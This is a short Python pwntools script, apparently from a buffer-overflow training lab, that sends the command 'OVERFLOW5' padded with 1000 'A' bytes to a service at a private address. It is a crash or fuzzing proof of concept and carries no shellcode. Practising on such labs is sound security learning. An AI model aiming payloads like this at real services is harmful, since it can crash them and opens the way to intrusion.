#!/usr/bin/env python3

from pwn import *

host = "10.10.49.190"
port = 1337

s = remote(host, port)

payload = [
    b"OVERFLOW5 ",
    b"A" * 1000,
]

payload = b"".join(payload)
s.send(payload)
s.close()